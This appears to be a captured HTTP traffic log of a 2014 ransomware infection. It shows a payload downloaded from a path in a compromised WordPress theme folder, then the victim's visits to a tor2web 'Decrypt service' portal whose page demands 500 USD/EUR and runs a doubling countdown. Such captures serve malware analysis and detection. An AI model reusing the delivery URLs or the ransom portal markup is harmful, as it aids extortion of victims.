@@ -1,0 +1,1001 @@
+[172.16.165.164:49159] -- -- --> [117.55.227.125:80] 
+GET /wp-content/themes/lightweight/hlka9j81f HTTP/1.1
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)
+Host: danielferris.com.au
+Cache-Control: no-cache
+
+
+HTTP/1.1 200 OK
+Date: Fri, 14 Nov 2014 22:33:23 GMT
+Server: Apache
+Last-Modified: Tue, 04 Nov 2014 13:01:31 GMT
+Accept-Ranges: bytes
+Content-Length: 564456
+X-Cnection: close
+Vary: Accept-Encoding, User-Agent
+
+{decode content failed, unknown charset}
+
+
+[172.16.165.164:49311] -- -- --> [194.58.103.250:80] 
+GET /1j7xbUs HTTP/1.1
+Accept: text/html, application/xhtml+xml, */*
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Accept-Encoding: gzip, deflate
+Host: paytordmbdekmizq.torpacho.com
+Connection: Keep-Alive
+
+
+HTTP/1.1 200 OK
+Server: nginx/1.0.15
+Date: Fri, 14 Nov 2014 22:39:35 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: keep-alive
+Content-Length: 3289
+X-Powered-By: PHP/5.4.34-0+deb7u1
+Set-Cookie: PHPSESSID=7scc2405m0c9cmo1eavq3qanj5; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Vary: Accept-Encoding
+
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+  <title>Decrypt service</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+  <link rel="stylesheet" href="img/style.css" type="text/css"/>
+  <script type="text/javascript">function dge(q){return document.getElementById(q);}(function h_hide(n){var hd=document.getElementById("tor2web-header");n++;if(hd)hd.style.display="none"; else if(n<15)setTimeout(function(){h_hide(n)},500);})(0)</script>
+  </head>
+  <body style="width:100%;" onload="document.getElementsByName('pic_code')[0].focus();">
+    <div id="maindiv" class="maindiv" style="width:100%" align=center valign=middle>
+      <table border=0 style="width:800px; margin-top:20px; margin-bottom:20px;" cellspacing=0 cellpadding=0>
+	<tr><td class="angle bltpng"></td>
+	  <td class="bwhite"></td>
+	  <td class="angle brtpng"></td>
+	</tr>
+	<tr><td class="bwhite"></td>
+	  <td class="bwhite" valign="top">
+	    <div id="decrypt" class="s13" style="text-align:center;">
+	      
+	          <center>
+		  <div style="border-style:solid; border-width:2px; border-color:#DEDEDE; padding:8px; width:330px;">
+		    <form method="POST" name="langs">
+		      <input type="hidden" id="scl" name="switchlang" value="">
+		&nbsp;&nbsp;<a href="javascript:void(0);" onclick="dge('scl').value='us'; langs.submit();"><img src="img/flags/us.png" style="border-width:0px;"> US</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="javascript:void(0);" onclick="dge('scl').value='it'; langs.submit();"><img src="img/flags/it.png" style="border-width:0px;"> IT</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="javascript:void(0);" onclick="dge('scl').value='fr'; langs.submit();"><img src="img/flags/fr.png" style="border-width:0px;"> FR</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="javascript:void(0);" onclick="dge('scl').value='es'; langs.submit();"><img src="img/flags/es.png" style="border-width:0px;"> ES</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="javascript:void(0);" onclick="dge('scl').value='de'; langs.submit();"><img src="img/flags/de.png" style="border-width:0px;"> DE</a>&nbsp;&nbsp;
+		    </form>
+		  </div>
+	          </center>
+		
+	    <div class="welcome">
+	      Service to decrypt the files.<br>To continue please enter the code from the picture in the input field.
+	    </div>
+	    <form action="" method="POST" onsubmit="var pic_code = document.getElementsByName('pic_code')[0]; if (pic_code.value.length != 5) { alert('Error: code must be 5 characters'); pic_code.focus(); return false; }">
+	      <img src="picture.php?k=1j7xbus&8724a3c6340a2712d7ebf0aa0d802782" style="border-style:solid; border-width:2px; border-color:#BBBBBB;"><br><br>
+	      
+	      <center>
+		<div style="border-style:solid; font-size:13px; border-width:2px; border-color:#DEDEDE; padding:8px; width:220px;">
+	        <b>Code of picture:</b> <input type="text" name="pic_code" class="welcome_code"  maxlength="5">
+	        </div>
+	      </center><br>
+	      <input type="submit" class="welcome_submit" value="Enter to decrypt service">
+	    </form>
+	    
+	    </div>
+	  </td>
+	  <td class="bwhite"></td>
+	</tr>
+	<tr><td class="angle blbpng"></td>
+	  <td class="bwhite"></td>
+	  <td class="angle brbpng"></td>
+	</tr>
+      </table>
+    </div>
+  </body>
+</html>
+
+
+[172.16.165.164:49311] -- -- --> [194.58.103.250:80] 
+GET /img/flags/us.png HTTP/1.1
+Accept: image/png, image/svg+xml, image/*;q=0.8, */*;q=0.5
+Referer: http://paytordmbdekmizq.torpacho.com/1j7xbUs
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Accept-Encoding: gzip, deflate
+Host: paytordmbdekmizq.torpacho.com
+Connection: Keep-Alive
+Cookie: PHPSESSID=7scc2405m0c9cmo1eavq3qanj5
+
+
+HTTP/1.1 200 OK
+Server: nginx/1.0.15
+Date: Fri, 14 Nov 2014 22:39:37 GMT
+Content-Type: image/png
+Connection: keep-alive
+Content-Length: 825
+Last-Modified: Thu, 25 Oct 2007 20:01:10 GMT
+ETag: "c80a01-339-43d56b2050d80;502d05ea6dc00"
+Accept-Ranges: bytes
+
+
+[172.16.165.164:49314] -- -- --> [194.58.103.250:80] 
+GET /img/flags/fr.png HTTP/1.1
+Accept: image/png, image/svg+xml, image/*;q=0.8, */*;q=0.5
+Referer: http://paytordmbdekmizq.torpacho.com/1j7xbUs
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Accept-Encoding: gzip, deflate
+Host: paytordmbdekmizq.torpacho.com
+Connection: Keep-Alive
+Cookie: PHPSESSID=7scc2405m0c9cmo1eavq3qanj5
+
+
+HTTP/1.1 200 OK
+Server: nginx/1.0.15
+Date: Fri, 14 Nov 2014 22:39:37 GMT
+Content-Type: image/png
+Connection: keep-alive
+Content-Length: 694
+Last-Modified: Thu, 25 Oct 2007 20:01:10 GMT
+ETag: "c8096b-2b6-43d56b2050d80;502d05ea6dc00"
+Accept-Ranges: bytes
+
+
+[172.16.165.164:49316] -- -- --> [194.58.103.250:80] 
+GET /img/flags/de.png HTTP/1.1
+Accept: image/png, image/svg+xml, image/*;q=0.8, */*;q=0.5
+Referer: http://paytordmbdekmizq.torpacho.com/1j7xbUs
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Accept-Encoding: gzip, deflate
+Host: paytordmbdekmizq.torpacho.com
+Connection: Keep-Alive
+Cookie: PHPSESSID=7scc2405m0c9cmo1eavq3qanj5
+
+
+HTTP/1.1 200 OK
+Server: nginx/1.0.15
+Date: Fri, 14 Nov 2014 22:39:37 GMT
+Content-Type: image/png
+Connection: keep-alive
+Content-Length: 534
+Last-Modified: Thu, 25 Oct 2007 20:01:10 GMT
+ETag: "c80959-216-43d56b2050d80;502d05ea6dc00"
+Accept-Ranges: bytes
+
+
+[172.16.165.164:49313] -- -- --> [194.58.103.250:80] 
+GET /img/flags/it.png HTTP/1.1
+Accept: image/png, image/svg+xml, image/*;q=0.8, */*;q=0.5
+Referer: http://paytordmbdekmizq.torpacho.com/1j7xbUs
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Accept-Encoding: gzip, deflate
+Host: paytordmbdekmizq.torpacho.com
+Connection: Keep-Alive
+Cookie: PHPSESSID=7scc2405m0c9cmo1eavq3qanj5
+
+
+HTTP/1.1 200 OK
+Server: nginx/1.0.15
+Date: Fri, 14 Nov 2014 22:39:37 GMT
+Content-Type: image/png
+Connection: keep-alive
+Content-Length: 552
+Last-Modified: Thu, 25 Oct 2007 20:01:10 GMT
+ETag: "c8098c-228-43d56b2050d80;502d05ea6dc00"
+Accept-Ranges: bytes
+
+
+[172.16.165.164:49312] -- -- --> [194.58.103.250:80] 
+GET /img/style.css HTTP/1.1
+Accept: text/css, */*
+Referer: http://paytordmbdekmizq.torpacho.com/1j7xbUs
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Accept-Encoding: gzip, deflate
+Host: paytordmbdekmizq.torpacho.com
+Connection: Keep-Alive
+Cookie: PHPSESSID=7scc2405m0c9cmo1eavq3qanj5
+
+
+HTTP/1.1 200 OK
+Server: nginx/1.0.15
+Date: Fri, 14 Nov 2014 22:39:37 GMT
+Content-Type: text/css
+Connection: keep-alive
+Content-Length: 4492
+Last-Modified: Wed, 24 Sep 2014 20:32:44 GMT
+ETag: "c808fe-118c-503d5960e7300"
+Accept-Ranges: bytes
+Vary: Accept-Encoding
+
+  *{
+    margin:0;
+    padding:0;
+    font-family: Arial;
+   }
+  body { overflow-x:hidden; overflow-y:auto; background:#33CCFF; }
+  hr { border: 1px #EFEFEF solid; margin:7px; }
+  li { padding-top:3px; }
+  .img { behavior: url('iepngfix.htc'); }
+  .div { padding:0; margin:0; }
+  .maindiv { position:absolute; width:800px; height:600px; }
+  .button { cursor:pointer; width:137px; height:28px; border-style:solid; cursor:hand; font-size:15px; font-weight:bold; color:white; border-width:0px; background:url('button.png');}
+  .angle { width:10px; height:10px; }
+  .bwhite { background:white; }
+  .cwhite { color:white; }
+  .bold { font-weight:bold; }
+  .s10 { font-size:10px; }
+  .s11 { font-size:11px; }
+  .s12 { font-size:12px; }
+  .s13 { font-size:13px; }
+  .s20 { font-size:20px; }
+  .s25 { font-size:25px; }
+  .cba { color:#BABABA; }
+  .cef { color:#EFEFEF; }
+  .lefttime { color:yellow; font-family:"Times New Roman"; }
+  .hw100 { width:100%; height:100%; }
+  .bltpng { background:url('lt.png') no-repeat; }
+  .brtpng { background:url('rt.png') no-repeat; }
+  .blbpng { background:url('lb.png') no-repeat; }
+  .brbpng { background:url('rb.png') no-repeat; }
+  #senddata { width:0px; height:0px; display:none; }
+  a { color:green; text-decoration:underline; cursor:pointer;}
+  .hide { display:none; }
+  .choosepayment { border-style:solid; border-width:1px; border-color:#BABABA; width:100%; height:24px; font-size:13px; font-weight:bold; }
+  .crypted_list { padding:2px; border-style:solid; border-width:1px; border-color:#BABABA; background:#EFEFEF; text-align:left; overflow:auto; }
+  .amount { width:31px; height:16px; color:#770000; background:inherit; text-align:center; border-style:solid; border-width:0px; font-size:12px; font-weight:bold; }
+  .coin_address { width:280px; height:17px; color:#770000; background:inherit; text-align:center; border-style:solid; border-width:1px; border-color:#D5D5D5; font-size:12px; font-weight:bold; }
+  .inputcode { border-style:solid; border-width:1px; border-color:#770000; text-align:center; font-size:13px; background:#FAFAFA; height:20px; }
+  .inputcurrency { border-style:solid; border-width:2px; border-color:#770000; text-align:center; font-size:13px; background:#FAFAFA; width:160px; height:22px; }
+  .clear_button { border-style:solid; border-width:1px; border-color:#770000; margin:0; padding:1px; background:#880000; color:white; height:22px; cursor:pointer; }
+  .button_pay { width:162px; height:36px; font-size:15px; font-weight:bold; color:#43664c; cursor:pointer; border-style:solid; border-width:0px; background:url('button_pay.png') no-repeat; }
+  .button_pay_sel { width:162px; height:36px; font-size:15px; font-weight:bold; color:#43664c; cursor:pointer; border-style:solid; border-width:0px; background:url('button_pay_sel.png') no-repeat; }
+  #info_msg { position:absolute; display:none; z-index:100; width:400px; left:50%; margin-left:-200px; margin-top:300px; padding:20px; background:#AEE4E8; text-align:center; font-size:14px; font-weight:bold; color:#990000; border-color:#770000; }
+  .tdpad { padding:3px; }
+  .drafts { width:750px; text-align:center; font-family:Arial; font-size:15px; }
+  .welcome { font-family:Arial; font-size:16px; font-weight:bold; color:#550000; margin-bottom:20px; }
+  .welcome_submit { border-style:solid; border-width:1px; border-color:lime; font-family:Arial; font-size:14px; background:green; padding:5px; color:yellow; font-weight:bold; }
+  .welcome_code { border-style:solid; border-weidth:1px; border-color:#BBBBBB; font-family:Arial; font-size:14px; text-align:center; width:95px; }
+  .bad_code { font-family:Arial; font-size:14px; color:#990000; margin-bottom:10px; }
+  .man_step { background:#C6FD93; font-weight:bold; padding:2px; position:relative; }
+  .question { color:green; }
+  .answer { margin-bottom:10px; }
+  #back_timer { color:red; font-size:20px; }
+  .selka { color:#DD2222; }
+  .err_input { border-style:solid; border-width:1px; border-color:red; }
+.abutton, .just_button, .bradius
+  {
+  font-family:Arial;
+  padding:4px;
+  border-style:solid;
+  border-color:black;
+  background-color:#FEFEFE;
+  text-decoration:none;
+  color:#032856;
+  border:1px solid #aaaaaa;
+  border-radius:3px 3px 3px 3px;
+  box-shadow:0 0 3px #CCCCCC;
+  margin:10px 0;
+  }
+
+.abutton:hover, .just_button:hover
+  {
+  color:#27408B;
+  border-color:#02fc21;
+  padding-left:5px;
+  padding-right:3px;
+  cursor:pointer;
+  }
+
+
+
+[172.16.165.164:49313] -- -- --> [194.58.103.250:80] 
+GET /img/rb.png HTTP/1.1
+Accept: image/png, image/svg+xml, image/*;q=0.8, */*;q=0.5
+Referer: http://paytordmbdekmizq.torpacho.com/1j7xbUs
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Accept-Encoding: gzip, deflate
+Host: paytordmbdekmizq.torpacho.com
+Connection: Keep-Alive
+Cookie: PHPSESSID=7scc2405m0c9cmo1eavq3qanj5
+
+
+HTTP/1.1 200 OK
+Server: nginx/1.0.15
+Date: Fri, 14 Nov 2014 22:39:39 GMT
+Content-Type: image/png
+Connection: keep-alive
+Content-Length: 237
+Last-Modified: Thu, 12 Dec 2013 05:21:52 GMT
+ETag: "c808fc-ed-4ed4f85eddc00"
+Accept-Ranges: bytes
+
+
+[172.16.165.164:49313] -- -- --> [194.58.103.250:80] 
+GET /favicon.ico HTTP/1.1
+Accept: */*
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Host: paytordmbdekmizq.torpacho.com
+Connection: Keep-Alive
+Cookie: PHPSESSID=7scc2405m0c9cmo1eavq3qanj5
+
+
+HTTP/1.1 200 OK
+Server: nginx/1.0.15
+Date: Fri, 14 Nov 2014 22:39:42 GMT
+Content-Type: image/vnd.microsoft.icon
+Connection: keep-alive
+Content-Length: 318
+Last-Modified: Tue, 06 May 2014 17:10:40 GMT
+ETag: "c808c4-13e-4f8be53c90400"
+Accept-Ranges: bytes
+
+
+[172.16.165.164:49316] -- -- --> [194.58.103.250:80] 
+GET /img/lb.png HTTP/1.1
+Accept: image/png, image/svg+xml, image/*;q=0.8, */*;q=0.5
+Referer: http://paytordmbdekmizq.torpacho.com/1j7xbUs
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Accept-Encoding: gzip, deflate
+Host: paytordmbdekmizq.torpacho.com
+Connection: Keep-Alive
+Cookie: PHPSESSID=7scc2405m0c9cmo1eavq3qanj5
+
+
+HTTP/1.1 200 OK
+Server: nginx/1.0.15
+Date: Fri, 14 Nov 2014 22:39:39 GMT
+Content-Type: image/png
+Connection: keep-alive
+Content-Length: 239
+Last-Modified: Thu, 12 Dec 2013 05:22:48 GMT
+ETag: "c808d1-ef-4ed4f89445a00"
+Accept-Ranges: bytes
+
+
+[172.16.165.164:49314] -- -- --> [194.58.103.250:80] 
+GET /img/rt.png HTTP/1.1
+Accept: image/png, image/svg+xml, image/*;q=0.8, */*;q=0.5
+Referer: http://paytordmbdekmizq.torpacho.com/1j7xbUs
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Accept-Encoding: gzip, deflate
+Host: paytordmbdekmizq.torpacho.com
+Connection: Keep-Alive
+Cookie: PHPSESSID=7scc2405m0c9cmo1eavq3qanj5
+
+
+HTTP/1.1 200 OK
+Server: nginx/1.0.15
+Date: Fri, 14 Nov 2014 22:39:39 GMT
+Content-Type: image/png
+Connection: keep-alive
+Content-Length: 242
+Last-Modified: Thu, 12 Dec 2013 05:21:36 GMT
+ETag: "c808fd-f2-4ed4f84f9b800"
+Accept-Ranges: bytes
+
+
+[172.16.165.164:49311] -- -- --> [194.58.103.250:80] 
+GET /img/lt.png HTTP/1.1
+Accept: image/png, image/svg+xml, image/*;q=0.8, */*;q=0.5
+Referer: http://paytordmbdekmizq.torpacho.com/1j7xbUs
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Accept-Encoding: gzip, deflate
+Host: paytordmbdekmizq.torpacho.com
+Connection: Keep-Alive
+Cookie: PHPSESSID=7scc2405m0c9cmo1eavq3qanj5
+
+
+HTTP/1.1 200 OK
+Server: nginx/1.0.15
+Date: Fri, 14 Nov 2014 22:39:39 GMT
+Content-Type: image/png
+Connection: keep-alive
+Content-Length: 240
+Last-Modified: Thu, 12 Dec 2013 03:32:50 GMT
+ETag: "c808d5-f0-4ed4dfffedc80"
+Accept-Ranges: bytes
+
+
+[172.16.165.164:49316] -- -- --> [194.58.103.250:80] 
+GET /img/style.css HTTP/1.1
+Accept: text/css, */*
+Referer: http://paytordmbdekmizq.torpacho.com/1j7xbUs
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Accept-Encoding: gzip, deflate
+Host: paytordmbdekmizq.torpacho.com
+Connection: Keep-Alive
+Cookie: PHPSESSID=7scc2405m0c9cmo1eavq3qanj5
+
+
+HTTP/1.1 200 OK
+Server: nginx/1.0.15
+Date: Fri, 14 Nov 2014 22:40:19 GMT
+Content-Type: text/css
+Connection: keep-alive
+Content-Length: 4492
+Last-Modified: Wed, 24 Sep 2014 20:32:44 GMT
+ETag: "c808fe-118c-503d5960e7300"
+Accept-Ranges: bytes
+Vary: Accept-Encoding
+
+  *{
+    margin:0;
+    padding:0;
+    font-family: Arial;
+   }
+  body { overflow-x:hidden; overflow-y:auto; background:#33CCFF; }
+  hr { border: 1px #EFEFEF solid; margin:7px; }
+  li { padding-top:3px; }
+  .img { behavior: url('iepngfix.htc'); }
+  .div { padding:0; margin:0; }
+  .maindiv { position:absolute; width:800px; height:600px; }
+  .button { cursor:pointer; width:137px; height:28px; border-style:solid; cursor:hand; font-size:15px; font-weight:bold; color:white; border-width:0px; background:url('button.png');}
+  .angle { width:10px; height:10px; }
+  .bwhite { background:white; }
+  .cwhite { color:white; }
+  .bold { font-weight:bold; }
+  .s10 { font-size:10px; }
+  .s11 { font-size:11px; }
+  .s12 { font-size:12px; }
+  .s13 { font-size:13px; }
+  .s20 { font-size:20px; }
+  .s25 { font-size:25px; }
+  .cba { color:#BABABA; }
+  .cef { color:#EFEFEF; }
+  .lefttime { color:yellow; font-family:"Times New Roman"; }
+  .hw100 { width:100%; height:100%; }
+  .bltpng { background:url('lt.png') no-repeat; }
+  .brtpng { background:url('rt.png') no-repeat; }
+  .blbpng { background:url('lb.png') no-repeat; }
+  .brbpng { background:url('rb.png') no-repeat; }
+  #senddata { width:0px; height:0px; display:none; }
+  a { color:green; text-decoration:underline; cursor:pointer;}
+  .hide { display:none; }
+  .choosepayment { border-style:solid; border-width:1px; border-color:#BABABA; width:100%; height:24px; font-size:13px; font-weight:bold; }
+  .crypted_list { padding:2px; border-style:solid; border-width:1px; border-color:#BABABA; background:#EFEFEF; text-align:left; overflow:auto; }
+  .amount { width:31px; height:16px; color:#770000; background:inherit; text-align:center; border-style:solid; border-width:0px; font-size:12px; font-weight:bold; }
+  .coin_address { width:280px; height:17px; color:#770000; background:inherit; text-align:center; border-style:solid; border-width:1px; border-color:#D5D5D5; font-size:12px; font-weight:bold; }
+  .inputcode { border-style:solid; border-width:1px; border-color:#770000; text-align:center; font-size:13px; background:#FAFAFA; height:20px; }
+  .inputcurrency { border-style:solid; border-width:2px; border-color:#770000; text-align:center; font-size:13px; background:#FAFAFA; width:160px; height:22px; }
+  .clear_button { border-style:solid; border-width:1px; border-color:#770000; margin:0; padding:1px; background:#880000; color:white; height:22px; cursor:pointer; }
+  .button_pay { width:162px; height:36px; font-size:15px; font-weight:bold; color:#43664c; cursor:pointer; border-style:solid; border-width:0px; background:url('button_pay.png') no-repeat; }
+  .button_pay_sel { width:162px; height:36px; font-size:15px; font-weight:bold; color:#43664c; cursor:pointer; border-style:solid; border-width:0px; background:url('button_pay_sel.png') no-repeat; }
+  #info_msg { position:absolute; display:none; z-index:100; width:400px; left:50%; margin-left:-200px; margin-top:300px; padding:20px; background:#AEE4E8; text-align:center; font-size:14px; font-weight:bold; color:#990000; border-color:#770000; }
+  .tdpad { padding:3px; }
+  .drafts { width:750px; text-align:center; font-family:Arial; font-size:15px; }
+  .welcome { font-family:Arial; font-size:16px; font-weight:bold; color:#550000; margin-bottom:20px; }
+  .welcome_submit { border-style:solid; border-width:1px; border-color:lime; font-family:Arial; font-size:14px; background:green; padding:5px; color:yellow; font-weight:bold; }
+  .welcome_code { border-style:solid; border-weidth:1px; border-color:#BBBBBB; font-family:Arial; font-size:14px; text-align:center; width:95px; }
+  .bad_code { font-family:Arial; font-size:14px; color:#990000; margin-bottom:10px; }
+  .man_step { background:#C6FD93; font-weight:bold; padding:2px; position:relative; }
+  .question { color:green; }
+  .answer { margin-bottom:10px; }
+  #back_timer { color:red; font-size:20px; }
+  .selka { color:#DD2222; }
+  .err_input { border-style:solid; border-width:1px; border-color:red; }
+.abutton, .just_button, .bradius
+  {
+  font-family:Arial;
+  padding:4px;
+  border-style:solid;
+  border-color:black;
+  background-color:#FEFEFE;
+  text-decoration:none;
+  color:#032856;
+  border:1px solid #aaaaaa;
+  border-radius:3px 3px 3px 3px;
+  box-shadow:0 0 3px #CCCCCC;
+  margin:10px 0;
+  }
+
+.abutton:hover, .just_button:hover
+  {
+  color:#27408B;
+  border-color:#02fc21;
+  padding-left:5px;
+  padding-right:3px;
+  cursor:pointer;
+  }
+
+
+
+[172.16.165.164:49313] -- -- --> [194.58.103.250:80] 
+POST /1j7xbUs HTTP/1.1
+Accept: text/html, application/xhtml+xml, */*
+Referer: http://paytordmbdekmizq.torpacho.com/1j7xbUs
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip, deflate
+Host: paytordmbdekmizq.torpacho.com
+Content-Length: 14
+Connection: Keep-Alive
+Cache-Control: no-cache
+Cookie: PHPSESSID=7scc2405m0c9cmo1eavq3qanj5
+
+pic_code=49UuC
+
+HTTP/1.1 200 OK
+Server: nginx/1.0.15
+Date: Fri, 14 Nov 2014 22:40:17 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: keep-alive
+Content-Length: 14415
+X-Powered-By: PHP/5.4.34-0+deb7u1
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Vary: Accept-Encoding
+
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+  <title>Decrypt service</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+  <link rel="stylesheet" href="img/style.css" type="text/css"/>
+  <script type="text/javascript">(function h_hide(n){var hd=document.getElementById("tor2web-header");n++;if(hd)hd.style.display="none"; else if(n<15)setTimeout(function(){h_hide(n)},500);})(0)</script>
+  <script type="text/javascript">
+    window.onerror = function (errorMsg, url, lineNumber) { return true; }
+    function dge(name){return document.getElementById(name);}
+    function show(name){var nt;if (typeof name == 'string')nt = dge(name);else nt = name;nt.style.display = 'block';return true;}
+    function hide(name){var nt;if (typeof name == 'string')nt = dge(name);else nt = name;nt.style.display = 'none';return true;}
+    function write_msg(msg){var info_msg = dge('info_msg');var info_msg_text = dge('info_msg_text');if (info_msg && info_msg_text){info_msg_text.innerHTML = msg;show(info_msg);}}
+    function reload_page(){var td=dge('testdecrypt_button');if (td)td.click();}
+
+    var sprintf=new function(){var f=['toString','toUpperCase','toLowerCase','toFixed','toExponential','toPrecision','fromCharCode','length'],
+    formats={
+	     '%':function(v){return'%'},
+	     'b':function(v){return(+v)[f[0]](2)},
+	     'c':function(v){return String[f[6]](+v)},
+	     'C':function(v){return String[f[6]](+v)[f[1]]()},
+	     'd':function(v){return(+v)?+v:0},
+	     'e':function(v){return(+v)[f[4]]()[f[0]]()},
+	     'E':function(v){return(+v)[f[4]]()[f[1]]()},
+	     'f':function(v,p){return(+v)[f[3]](p)},
+	     'F':function(v,p){return(+v)[f[3]](p)},
+	     'g':function(v,p){return((+v)[f[5]](p)[f[0]]()[f[7]]<(+v)[f[4]]()[f[0]]()[f[7]]?(+v)[f[5]](p):(+v)[f[4]]())[f[0]]()},
+	     'G':function(v,p){return((+v)[f[5]](p)[f[0]]()[f[7]]<(+v)[f[4]]()[f[0]]()[f[7]]?(+v)[f[5]](p):(+v)[f[4]]())[f[1]]()},
+	     'o':function(v){return(  +v)[f[0]](8)},
+	     's':function(v){return(''+v)[f[0]]()},
+	     'S':function(v){return(''+v)[f[1]]()},
+	     'u':function(v){return Math.abs(+v)},
+	     'x':function(v){return(  +v)[f[0]](16)[f[2]]()},
+	     'X':function(v){return(  +v)[f[0]](16)[f[1]]()}
+	    },
+	    format=function(d){var i=0;return function(m,a,b,s,w,p,n,f){var r=''+formats[f]((typeof d[i]=='object')?d[(d.length==1)?i:i++][n]:d[(d.length==1)?i:i++],p);if(r=="%"&&d.length!=1)i--;if(a)b=a;while(b&&b.length&&r.length<+w)r=(s=="-")?(r+b):(b+r);return r}},
+	    re=new RegExp('%(?:(?:[\'\"](.)|([0 ]))?([+-])?(\\d+)?(?:\\.(\\d+))?(?:\\(([^)]+)\\))?)([%bcCdeEfFgGosSuxX])','g');
+	    return function(s){return s.replace(re,format(Array.apply(null,arguments).slice(1)))};
+    };
+
+    function back_timer(id, backtime)
+      {
+      var dwatch = document.getElementById(id);
+      if (dwatch)
+	{
+        var hours = sprintf("%02d", Math.floor(backtime/3600));
+        var minutes = sprintf("%02d", Math.floor((backtime - 3600*Math.floor(backtime/3600))/60));
+        var seconds = sprintf("%02d", backtime - 60*Math.floor((backtime - 3600*Math.floor(backtime/3600))/60) - 3600*Math.floor(backtime/3600));
+        dwatch.innerHTML = "<b>" + hours + "</b><font color=black>h</font> <b>" + minutes + "</b><font color=black>m</font> <b>" + seconds + "</b><font color=black>s</font>";
+        if (backtime > 0) { setTimeout("back_timer('"+id+"',"+(backtime-1)+")", 1000); }
+	}
+      }
+  </script>
+  </head>
+  <body style="width:100%;" onload="back_timer('back_timer', 648000)">
+
+    <div id="info_msg" class="bradius info_msg" style="">
+      <div id="info_msg_text"></div><center><br><input type="button" class="abutton" value="Close message" onclick="document.getElementById('info_msg').style.display = 'none'"></center>
+    </div>
+
+    <div id="maindiv" class="maindiv" style="width:100%" align=center valign=middle>
+      
+      <table border=0 style="width:850px; margin-top:20px;" cellspacing=0 cellpadding=0>
+	<tr><td class="angle bltpng"></td>
+	  <td class="bwhite"></td>
+	  <td class="angle brtpng"></td>
+	</tr>
+	<tr><td class="bwhite"></td>
+	  <td class="bwhite" valign="top">
+	    <div id="decrypt" class="s13" style="font-family:Arial; font-size:15px; color:#1a175f; text-align:center;">
+	    <span style="color:#550000; line-height:20px;"><b>Your files are encrypted.</b><br> To get the key to decrypt files you have to pay <b class="selka">500 USD/EUR</b>. If payment is not made ​​before <b class="selka">22/11/14 - 04:39</b> the cost of decrypting files will increase <b class="selka">2</b> times and will be <b class="selka">1000 USD/EUR</b><div style="padding-top:10px; line-height:22px;">Prior to increasing the amount left:<br><span id="back_timer"></span></div></span><hr><div id="machine_info" style="position:relative; font-family:inherit; font-size:12px; color:#222222; margin-top:5px;">Your system: <font color=green>Windows 7</font> (<font color=green>x64</font>) &nbsp;&nbsp; First connect IP: <font color=green>74.115.214.195</font> <img src="img/flags/us.png" style="border-width:0px;" title="US">  &nbsp;&nbsp; <font color="#550000;">Total encrypted <b>40</b> files.</font></div>
+	    </div>
+	  </td>
+	  <td class="bwhite"></td>
+	</tr>
+	<tr><td class="angle blbpng"></td>
+	  <td class="bwhite"></td>
+	  <td class="angle brbpng"></td>
+	</tr>
+      </table>
+      <div style="">
+	<form method="POST" return false;">
+	  <input type="hidden" id="page" name="page" value="">
+	  <input type="submit" class="just_button" value="Refresh" onclick="dge('page').value='index'">
+          <input type="submit" class="just_button" style="font-weight:bold; color:green;" value="Payment" onclick="dge('page').value='index'">
+	  <input type="submit" class="just_button" value="FAQ" onclick="dge('page').value='faq'">
+	  
+	  <input type="submit" class="just_button" style="font-weight:bold; color:green;" value="Decrypt 1 file for FREE" onclick="dge('page').value='testdecrypt'" id="testdecrypt_button">
+	  <input type="submit" class="just_button" value="Support" onclick="dge('page').value='support'">
+	</form>
+      </div>
+      <div class="bradius" style="display:none; position:fixed; z-index:100; width:500px; height:30px; top:200px; left:50%; margin-left:-250px; color:#FFFFFF; font-weight:bold; font-size:14px; border-width:2px; border-color:#FA4343; background:#800000;">
+	You have entered an invalid check number or transaction ID
+      </div>
+	
+      <table border=0 style="width:850px; margin-top:0px; margin-bottom:20px;" cellspacing=0 cellpadding=0>
+	<tr><td class="angle bltpng"></td>
+	  <td class="bwhite"></td>
+	  <td class="angle brtpng"></td>
+	</tr>
+	<tr><td class="bwhite"></td>
+	  <td class="bwhite" valign="top">
